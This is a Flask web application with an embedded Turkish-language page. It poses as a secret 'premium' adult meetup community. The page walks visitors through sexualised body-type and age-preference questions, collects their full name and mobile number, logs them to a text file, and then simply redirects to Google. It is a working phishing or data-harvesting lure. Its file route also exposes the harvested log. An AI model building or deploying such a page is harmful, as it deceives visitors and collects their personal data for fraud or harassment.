from flask import Flask, render_template_string, send_from_directory
from flask_socketio import SocketIO, emit
import datetime
import os
import urllib.parse

# Uygulama başlatma
app = Flask(__name__)
app.config['SECRET_KEY'] = 'premium_v12_final_2026'

# Python 3.14 uyumu için eventlet yerine gthread tabanlı SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")

# Görsel ve dosya yönetimi (files klasörü için)
@app.route('/files/<path:filename>')
def custom_static(filename):
    safe_filename = urllib.parse.unquote(filename)
    return send_from_directory(os.getcwd(), safe_filename)

USER_PAGE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Erişim Merkezi</title>
    <style>
        :root { --primary-color: #ff0033; --bg-dark: #0a0a0a; }
        
        body { 
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-dark) url('/files/arkaplan.jpg') no-repeat center center fixed; 
            background-size: cover; min-height: 100vh; 
            display: flex; justify-content: center; align-items: center; color: white;
            overflow-x: hidden; transition: background 0.8s ease;
        }

        .gif-bg { 
            background: #000 url('/files/kadin.gif') no-repeat center center fixed !important; 
            background-size: cover !important; 
        }

        .overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: radial-gradient(circle, rgba(0,0,0,0.3) 0%, rgba(10,10,10,0.85) 100%);
            z-index: 0;
        }

        .main-container { position: relative; z-index: 2; width: 95%; max-width: 420px; }

        .card { 
            background: rgba(15, 15, 15, 0.75); 
            backdrop-filter: blur(20px); 
            -webkit-backdrop-filter: blur(20px);
            padding: 40px 30px; border-radius: 28px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            display: none; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            text-align: center;
        }
        
        .active { display: block; animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1); }

        @keyframes slideUp { 
            from { opacity: 0; transform: translateY(40px); } 
            to { opacity: 1; transform: translateY(0); } 
        }
        
        h1 { font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 12px; color: #fff; }
        p { color: rgba(255,255,255,0.8); font-size: 15px; margin-bottom: 30px; line-height: 1.6; }

        .selection-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .choice-item { 
            cursor: pointer; transition: all 0.3s ease; text-align: center;
            background: rgba(255,255,255,0.06); border-radius: 18px; padding: 12px;
            border: 1px solid transparent;
        }
        .choice-item img { width: 100%; height: 130px; object-fit: cover; border-radius: 14px; margin-bottom: 10px; }
        .choice-item p { margin: 0; font-size: 13px; font-weight: 700; color: #fff; }
        .choice-item:hover { background: rgba(255,0,51,0.15); border-color: var(--primary-color); transform: translateY(-8px); }

        input { 
            width: 100%; padding: 18px; margin-bottom: 18px; 
            background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.15); 
            color: #fff; border-radius: 14px; box-sizing: border-box; font-size: 16px;
        }
        input:focus { outline: none; border-color: var(--primary-color); background: rgba(255,255,255,0.2); }

        .btn { 
            width: 100%; padding: 20px; border: none; border-radius: 14px; 
            font-weight: 800; cursor: pointer; text-transform: uppercase; 
            font-size: 14px; letter-spacing: 1.2px; transition: all 0.4s;
        }
        .btn-red { background: var(--primary-color); color: white; box-shadow: 0 10px 25px rgba(255,0,51,0.4); }
        .btn-red:hover { transform: translateY(-3px); background: #ff1a47; }
        
        .btn-outline { background: transparent; border: 1px solid rgba(255,255,255,0.3); color: white; margin-top: 12px; }

        .char-img { width: 100%; border-radius: 20px; margin-bottom: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        .step-label { color: var(--primary-color); font-weight: 800; font-size: 13px; text-transform: uppercase; margin-bottom: 8px; display: block; }
    </style>
</head>
<body id="main-body">
    <div class="overlay"></div>
    <div class="main-container">

        <div id="step-0" class="card active">
            <h1>PREMIUM GİRİŞ</h1>
            <p>Gizli topluluğumuza katılmadan önce lütfen üyelik şartlarını onaylayın.</p>
            <img src="/files/karakter.jpg" class="char-img">
            <button class="btn btn-red" onclick="move(1)">ONAYLIYORUM</button>
        </div>

        <div id="step-1" class="card">
            <span class="step-label">Aşama 1 / 3</span>
            <h1>YAKINLIK DURUMU</h1>
            <p>Üyelerimiz oldukça aktiftir. Bu sizin için bir problem teşkil eder mi?</p>
            <button class="btn btn-red" onclick="move(2)">HAYIR, SORUN OLMAZ</button>
            <button class="btn btn-outline" onclick="move(2)">EVET, EDER</button>
        </div>

        <div id="step-2" class="card">
            <span class="step-label">Aşama 2 / 3</span>
            <h1>GİZLİLİK TAAHHÜDÜ</h1>
            <p>Tüm buluşmaların gizli kalacağına ve platform dışına bilgi sızdırmayacağınıza söz veriyor musunuz?</p>
            <button class="btn btn-red" onclick="move(3)">EVET, SÖZ VERİYORUM</button>
        </div>

        <div id="step-3" class="card">
            <span class="step-label">Aşama 3 / 3</span>
            <h1>DÜRÜSTLÜK</h1>
            <p>İletişim kurduğunuz diğer üyelere karşı her zaman dürüst ve saygılı olacak mısınız?</p>
            <button class="btn btn-red" onclick="move('choices')">EVET, EMİNİM</button>
        </div>

        <div id="step-choices" class="card">
            <h1>VÜCUT TİPİ SEÇİMİ</h1>
            <p>Size uygun eşleşmeleri filtrelememiz için tercihinizi yapın.</p>
            <div class="selection-grid">
                <div class="choice-item" onclick="move('age')"><img src="/files/zayıf.jpg"><p>Zayıf</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/normal.jpg"><p>Normal</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/balık etli.jpg"><p>Balık Etli</p></div>
                <div class="choice-item" onclick="move('age')"><img src="/files/büyük göğüs.jpg"><p>Fit / Kıvrımlı</p></div>
            </div>
        </div>

        <div id="step-age" class="card">
            <h1>YAŞ ARALIĞI</h1>
            <p>Hangi yaş grubundaki üyelerle ilgileniyorsunuz?</p>
            <div class="selection-grid">
                <div class="choice-item" onclick="move('final')"><img src="/files/18.jpg"><p>18 - 25</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/25.jpg"><p>25 - 40</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/40.jpg"><p>40 - 55</p></div>
                <div class="choice-item" onclick="move('final')"><img src="/files/60.jpg"><p>55 - 70</p></div>
            </div>
        </div>

        <div id="step-final" class="card">
            <span class="step-label">SON ADIM</span>
            <h1>EĞLENCEYE BAŞLA</h1>
            <p style="font-weight: 700;">Tüm soruları tamamladınız! Üyeliğinizi aktive etmek için bilgilerinizi girin.</p>
            <input type="text" id="isim" placeholder="Ad Soyad">
            <input type="tel" id="numara" placeholder="05XX XXX XX XX" maxlength="11">
            <button class="btn btn-red" onclick="finish()">KAYIT OL VE GİRİŞ YAP</button>
        </div>

    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        
        function move(step) {
            const body = document.getElementById('main-body');
            if(step === 'final') body.classList.add('gif-bg');
            else body.classList.remove('gif-bg');

            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
            const nextStep = document.getElementById('step-' + step);
            if(nextStep) nextStep.classList.add('active');
        }

        function finish() {
            const isim = document.getElementById('isim').value;
            const numara = document.getElementById('numara').value;
            const checkNum = /^05[0-9]{9}$/;
            
            if (!isim || isim.length < 3) { alert("Lütfen adınızı girin."); return; }
            if (!checkNum.test(numara)) { alert("Geçerli bir 05XX numarası girin."); return; }
            
            socket.emit('yeni_kayit', { isim, numara });
            alert("Kaydınız alındı, yönlendiriliyorsunuz...");
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index(): return render_template_string(USER_PAGE)

@socketio.on('yeni_kayit')
def handle_kayit(data):
    zaman = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    with open("kayitlar.txt", "a", encoding="utf-8") as f:
        f.write(f"Zaman: {zaman} | İsim: {data['isim']} | Tel: {data['numara']}\\n")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 80))
    socketio.run(app, host='0.0.0.0', port=port)
